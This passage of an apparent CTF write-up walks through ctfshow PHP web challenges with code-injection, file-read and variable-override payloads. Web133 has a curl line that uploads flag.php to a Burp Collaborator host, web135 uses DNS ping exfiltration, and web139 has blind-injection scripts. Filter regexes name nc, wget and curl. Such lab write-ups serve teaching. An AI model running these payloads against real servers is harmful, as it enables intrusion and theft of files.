$_GET[&#39;v1&#39;];    $v2 &#x3D; $_GET[&#39;v2&#39;];    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#39;&#x2F;\~| |\&#96;|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\&#x3D;|\&#123;|\[|\;|\:|\&quot;|\&#39;|\,|\.|\?|\\\\|\&#x2F;|[0-9]|\&lt;|\&gt;&#x2F;&#39;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;        if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125;</code></pre><p>利用变量覆盖让$ctfshow=全局变量</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506180100307.png" alt="image-20220506180100307"></p><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#39;&#x2F;\.\.\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;</code></pre><p>filter协议直接读，或者用一些没被过滤的编码</p><pre class="language-php" data-language="php"><code class="language-php">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.phpphp:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.phpphp:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.phpcompress.zlib:&#x2F;&#x2F;flag.php</code></pre><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#39;&#x2F;filter|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&#39;hacker!&#39;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;</code></pre><p>filter被禁了，可以换一个</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506174743375.png" alt="image-20220506174743375"></p><p>或这利用多次重复绕过is_file的判断</p><p>linux里<code>/proc/self/root</code>是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code>，其实显示的内容是根目录下的内容</p><pre class="language-php" data-language="php"><code class="language-php">payload：?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</code></pre><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506180821666.png" alt="image-20220506180821666"></p><p>不带编码的filter</p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><pre class="language-php" data-language="php"><code class="language-php">include(&#39;flag.php&#39;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123;    $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;$num&#x3D;$_GET[&#39;num&#39;];if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;    if($num&#x3D;&#x3D;&#39;36&#39;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;else&#123;    echo &quot;hacker!!!&quot;;&#125;</code></pre><p>在不影响数字类型的前提下能加的字符除了数字和+-.号以外还有 %09 %0a %0b %0c %0d %20，trim过滤了 %09 %0a %0b %0d %20，所以只剩下%0c换页符了</p><p>payload：</p><p>num=%0c36</p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?&#x2F;&quot;, $c)&amp;&amp;$c&lt;&#x3D;18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;</code></pre><p>PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格+ . [转换为_</p><p>所以我们没有办法post CTF_SHOW.COM进去</p><p>这里就用到了php变量名特性绕过</p><p>在变量名中出现了[的话，在get、post传参中，[就会被替换成_，然后其后的字母不会发生变化，CTF[SHOW.COM=&gt;CTF_SHOW.COM</p><p>然后直接输出flag变量</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506183011845.png" alt="image-20220506183011845"></p><p>再来几个其他的</p><p>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=var_export($GLOBALS)读取全局变量</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506183352375.png" alt="image-20220506183352375"></p><pre class="language-php" data-language="php"><code class="language-php">payload:get:  $fl0g&#x3D;flag_give_me;post:  CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</code></pre><p>这种就是在eval里执行这个赋值语句$fl0g=flag_give_me;就能满足后边的判断输出flag</p><p>下面这个是预期解</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506183835525.png" alt="image-20220506183835525"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506184715179.png" alt="image-20220506184715179"></p><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print&#x2F;i&quot;, $c)&amp;&amp;$c&lt;&#x3D;16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);         if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;</code></pre><p>可以用123的预期解</p><p>或者包含一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506185355334.png" alt="image-20220506185355334"></p><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a&#x3D;$_SERVER[&#39;argv&#39;];$c&#x3D;$_POST[&#39;fun&#39;];if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123;    if(!preg_match(&quot;&#x2F;\\\\|\&#x2F;|\~|\&#96;|\!|\@|\#|\%|\^|\*|\-|\+|\&#x3D;|\&#123;|\&#125;|\&quot;|\&#39;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d&#x2F;i&quot;, $c) &amp;&amp; strlen($c)&lt;&#x3D;16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;</code></pre><p>123的预期解还是能用，或者是</p><pre class="language-php" data-language="php"><code class="language-php">?$fl0g&#x3D;flag_give_mePOST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])&#x2F;&#x2F;就是用assert替换eval</code></pre><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);include(&quot;flag.php&quot;);highlight_file(__FILE__);$ctf_show &#x3D; md5($flag);$url &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];&#x2F;&#x2F;特殊字符检测function waf($url)&#123;    if(preg_match(&#39;&#x2F;\&#96;|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#39;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\&#x2F;&#x2F;&#39;, $url))&#123;        return true;    &#125;else&#123;        return false;    &#125;&#125;if(waf($url))&#123;    die(&quot;嗯哼？&quot;);&#125;else&#123;    extract($_GET);&#125;if($ctf_show&#x3D;&#x3D;&#x3D;&#39;ilove36d&#39;)&#123;    echo $flag;</code></pre><p>下划线被过滤了，可以用空格代替</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?ctf show&#x3D;ilove36d</code></pre><h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><p> _()是一个函数</p><p>_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p><p>当php开启了gettext扩展后，可以绕过字母</p><pre class="language-none"><code class="language-none">echo gettext(phpinfo());&#x3D;&#x3D;&#x3D;echo _(phpinfo());</code></pre><p><strong>get_defined_vars()</strong></p><p>get_defined_vars — 返回由所有已定义变量所组成的数组</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506200639084.png" alt="image-20220506200639084"></p><h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><pre class="language-php" data-language="php"><code class="language-php">f&#x3D;..&#x2F;ctfshow&#x2F;..&#x2F;html&#x2F;flag.php</code></pre><p>目录穿越</p><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#39;f&#39;]))&#123;    $f &#x3D; $_POST[&#39;f&#39;];    if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;        die(&#39;bye!&#39;);    &#125;    if(stripos($f, &#39;ctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;        die(&#39;bye!!&#39;);    &#125;    echo $flag;&#125;</code></pre><p>利用preg_match的回溯限制，如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p><p>也可以用数组绕过</p><p>第二个正则匹配是强等于，类型必须相同</p><p>采用<code>数组</code>绕过的方法，<code>stripos函数</code>会返回<code>null</code>,<code>null!=false</code>,所以可以绕过stripos函数</p><h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>跟web132差不多，就是不知道为什么不能数组绕过，只能利用最大回溯了</p><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;code&#39;]))&#123;    $username &#x3D; (String)$_GET[&#39;username&#39;];    $password &#x3D; (String)$_GET[&#39;password&#39;];    $code &#x3D; (String)$_GET[&#39;code&#39;];    if($code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;&quot;admin&quot;)&#123;                if($code &#x3D;&#x3D; &#39;admin&#39;)&#123;            echo $flag;        &#125;            &#125;&#125;</code></pre><p>让if为真只要让username=admin就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506203341551.png"></p><h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);&#x2F;&#x2F;flag.phpif($F &#x3D; @$_GET[&#39;F&#39;])&#123;    if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|netcat&#x2F;i&#39;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;6个字母都还不够呀?!&quot;);    &#125;&#125;</code></pre><pre class="language-txt" data-language="txt"><code class="language-txt">get传参   F&#x3D;&#96;$F &#96;;sleep 3经过substr($F,0,6)截取后 得到  &#96;$F &#96;;也就是会执行 eval(&quot;&#96;$F &#96;;&quot;);我们把原来的$F带进去eval(&quot;&#96;&#96;$F &#96;;sleep 3&#96;&quot;);也就是说最终会执行  &#96;&#96;$F &#96;;sleep 3&#96; &#x3D;&#x3D; shell_exec(&quot;&#96;$F &#96;;sleep 3&quot;);前面的命令我们不需要管，但是后面的命令我们可以自由控制。这样就在服务器上成功执行了 sleep 3</code></pre><p>然后因为没有回显，可以通过curl外带来查看<br>这里可以用bp也可以用vps<br>curl -F 将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506205540822.png" alt="image-20220506205540822"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506205559475.png" alt="image-20220506205559475"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220506205834293.png" alt="image-20220506205834293"></p><pre class="language-none"><code class="language-none">?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php  http:&#x2F;&#x2F;8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net#其中-F 为带文件的形式发送post请求#xx是上传文件的name值，flag.php就是上传的文件 </code></pre><p>还可以利用cp命令将flag.php里的内容复制到一个txt内，然后直接访问</p><pre class="language-none"><code class="language-none">&#96;$F&#96; ;cp flag.php 1234.txt</code></pre><p>还可以dnslog外带</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507181310310.png" alt="image-20220507181310310"></p><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);$key1 &#x3D; 0;$key2 &#x3D; 0;if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) &#123;    die(&quot;nonononono&quot;);&#125;@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);extract($_POST);if($key1 &#x3D;&#x3D; &#39;36d&#39; &amp;&amp; $key2 &#x3D;&#x3D; &#39;36d&#39;) &#123;    die(file_get_contents(&#39;flag.php&#39;));&#125;</code></pre><p>不能传入key1，key2，可以利用extract的变量覆盖绕过</p><p>$_SERVER[‘QUERY_STRING’]<br>获取查询语句，实例中可知，获取的是?后面的值，只有get请求</p><p>extract()<br>该函数是将数组中的值依次复制给$键=值</p><p>parse_string()<br>将字符串解析到变量中</p><p>如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</code></pre><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">error_reporting(0);highlight_file(__FILE__);&#x2F;&#x2F;flag.phpif($F &#x3D; @$_GET[&#39;F&#39;])&#123;    if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head&#x2F;i&#39;, $F))&#123;        eval(substr($F,0,6));    &#125;else&#123;        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);    &#125;&#125;</code></pre><ul><li>nl，cat，tac，more，less，tail等都可以读文件</li><li>awk加上NR参数可以读取指定行数，记得加引号</li><li>tr -cd 后面可以加正则表达式</li></ul><p>用ping的话建议用dnslog.cn别用ceye.io，因为ceye给的域名在ping的时候会显示找不到主机，没法成功ping</p><p>而且只要这个payload才能成功</p><pre class="language-txt" data-language="txt"><code class="language-txt">F&#x3D;&#96;$F&#96;; ping &#96;nl flag.php|awk &#39;&#x2F;flag&#x2F;&#39;| tr -cd &quot;[a-z]&quot;&#x2F;&quot;[0-9]&quot;&#96;.klj10h.dnslog.cn -c 1</code></pre><p>这里直接nl带不出来可能是因为内容太多了，但是awk后边的flag换成ctfshow也出不了我不太清楚为什么</p><p>可以用下边这个命令查看目录</p><pre class="language-sh" data-language="sh"><code class="language-sh">printf &#39;%s&#39; *</code></pre><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);function check($x)&#123;    if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;        die(&#39;too young too simple sometimes naive!&#39;);    &#125;&#125;if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125; </code></pre><p>exec无回显</p><p>要尝试将命令的结果输入到一个文件中</p><p>在没有&gt;的前提下可以利用tee命令</p><p>tee file //覆盖</p><p>tee -a file //追加</p><p>tee - //输出到标准输出两次</p><p>tee --//输出到标准输出三次</p><p>tee file1 file2 // 输出到标准输出两次，并写到那两个文件中</p><p>ls | tee file</p><p>所以payload：</p><pre class="language-php" data-language="php"><code class="language-php">ls &#x2F;|tee anl &#x2F;f149_15_h3r3|tee a</code></pre><h2 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#39;ctfshow&#39;]);</code></pre><p>考察调用类中的函数<br>双冒号可以不用实例化类就可以直接调用类中的方法</p><pre class="language-php" data-language="php"><code class="language-php">ctfshow&#x3D;ctfshow::getFlag</code></pre><pre class="language-txt" data-language="txt"><code class="language-txt">php中 -&gt;与:: 调用类中的成员的区别-&gt;用于动态语境处理某个类的某个实例::可以调用一个静态的、不依赖于其他初始化的类方法.</code></pre><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;if(strripos($_POST[&#39;ctfshow&#39;], &quot;:&quot;)&gt;-1)&#123;    die(&quot;private function&quot;);&#125;call_user_func($_POST[&#39;ctfshow&#39;]); </code></pre><p>call_user_func()可以传数组</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507210208231.png" alt="image-20220507210208231"></p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">ctfshow[]&#x3D;ctfshow&amp;ctfshow[]&#x3D;getFlag</code></pre><h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);function check($x)&#123;    if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;        die(&#39;too young too simple sometimes naive!&#39;);    &#125;&#125;if(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    check($c);    exec($c);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>虽然看起来和136差不多，但是没了写文件的权限</p><p>盲打看起来有些离谱</p><p>放一下脚本吧就(不实践了，跑脚本也不需要啥技术</p><p>获取文件名的脚本：</p><pre class="language-php" data-language="php"><code class="language-php">import requestsimport timeimport stringstr&#x3D;string.ascii_letters+string.digits#生成所有字母与数字[a-zA-Z0-9]result&#x3D;&quot;&quot;for i in range(1,5):key&#x3D;0for j in range(1,15):if key&#x3D;&#x3D;1:breakfor n in str:payload&#x3D;&quot;if [ &#96;ls &#x2F;|awk &#39;NR&#x3D;&#x3D;&#123;0&#125;&#39;|cut -c &#123;1&#125;&#96; &#x3D;&#x3D; &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)#print(payload)url&#x3D;&quot;http:&#x2F;&#x2F;877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c&#x3D;&quot;+payloadtry:requests.get(url,timeout&#x3D;(2.5,2.5))except:    result&#x3D;result+n    print(result)    breakif n&#x3D;&#x3D;&#39;9&#39;:key&#x3D;1result+&#x3D;&quot; &quot;</code></pre><p>猜解文件内容的脚本：</p><pre class="language-none"><code class="language-none">import requestsimport timeimport stringstr&#x3D;string.digits+string.ascii_lowercase+&quot;-&quot;#获取小写字母与数字result&#x3D;&quot;&quot;key&#x3D;0for j in range(1,45):print(j)if key&#x3D;&#x3D;1:breakfor n in str:payload&#x3D;&quot;if [ &#96;cat &#x2F;f149_15_h3r3|cut -c &#123;0&#125;&#96; &#x3D;&#x3D; &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)#print(payload)url&#x3D;&quot;http:&#x2F;&#x2F;877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c&#x3D;&quot;+payloadtry:requests.get(url,timeout&#x3D;(2.5,2.5))#time()第一个参数是响应时间，第二个是读取时间except:    result&#x3D;result+n    print(result)    break</code></pre><p>一些分析</p><pre class="language-php" data-language="php"><code class="language-php">用awk命令、cut命令截取字符sleep命令确认是否正确awk NR&#x3D;&#x3D;2 获取第二行信息cut -c 1  截取第1个字符zsh下if语句的格式： if [[condition]] &#123;command&#125; elif &#123;&#125; else &#123;&#125;</code></pre><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_POST[&#39;f1&#39;]) &amp;&amp; isset($_POST[&#39;f2&#39;]))&#123;    $f1 &#x3D; (String)$_POST[&#39;f1&#39;];    $f2 &#x3D; (String)$_POST[&#39;f2&#39;];    if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f1))&#123;        if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f2))&#123;            $code &#x3D; eval(&quot;return $f1($f2());&quot;);            if(intval($code) &#x3D;&#x3D; &#39;ctfshow&#39;)&#123;                echo file_get_contents(&quot;flag.php&quot;);            &#125;        &#125;    &#125;&#125;</code></pre><p>php的弱比较</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/1e0d551aaf224921bcf46924b3652619.png" alt="在这里插入图片描述"></p><p>intval会将非数字字符转换为0</p><p>而0==“字符串”为真</p><p>所以只要让等号右边的玩意是字符串就行了</p><pre class="language-php" data-language="php"><code class="language-php">md5(phpinfo())md5(sleep())md5(md5())current(localeconv)sha1(getcwd())     因为&#x2F;var&#x2F;www&#x2F;html md5后开头的数字所以我们改用sha1</code></pre><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><pre class="language-php" data-language="php"><code class="language-php">#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v3))&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;</code></pre><p>/^\W+$/用于匹配非数字字母下划线的字符</p><p>这里只要求v1v2是数字就行，而在PHP中</p><p>数字可以和命令进行一些运算，比如<code>1-phpinfo()-1</code>输出的还是<code>phpinfo()</code><br>所以这里可以<code>1-system(&#39;tac f*&#39;)-1</code><br>构造的话或、取反或者异或都行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507213624723.png" alt="image-20220507213624723"></p><pre class="language-php" data-language="php"><code class="language-php">v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;-(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)- &#x2F;&#x2F;system(&#39;cat flag.php&#39;)</code></pre><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    if(is_numeric($v1))&#123;        $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep($d);        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;</code></pre><p>直接让v1=0或0x0</p><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    if(is_numeric($v1))&#123;        $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep($d);        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;</code></pre><p>取反被过滤了，还可以用异或，减号可以用乘号替换，唯一的问题是在payload里不要有这些过滤了的字符的url编码，比如%2e</p><p>用%02^%2c来代表.</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;*(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%02%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2c%60%60%60&quot;)*</code></pre><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; 